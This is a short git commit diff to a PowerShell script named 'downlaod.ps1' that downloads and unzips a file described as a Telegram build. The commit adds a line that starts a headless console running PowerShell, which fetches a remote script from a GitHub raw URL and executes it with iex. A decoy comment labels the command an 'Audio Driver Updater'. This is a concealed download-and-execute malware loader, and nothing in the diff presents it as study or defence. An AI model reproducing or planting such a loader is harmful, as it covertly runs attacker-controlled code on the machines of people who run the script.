0de0f2463e0f89985e0969648f01dd63385e0975
waed69 <waedpsn2@gmail.com>
2025-04-26 18:32:48 +0200

    Update downlaod.ps1

--- downlaod.ps1
+++ downlaod.ps1
@@ -4,3 +4,5 @@ $ExtractPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild"  # Folder to unz
 Invoke-WebRequest -Uri $Source -OutFile $DownloadPath
 Start-Sleep -Seconds 4
 Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
+Start-Sleep -Seconds 3
+Start-Process conhost.exe -ArgumentList "--headless powershell -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/brabus.ps1 | iex; '# Audio Driver Updater 4.7X - (Build 2025.01.12)'`""
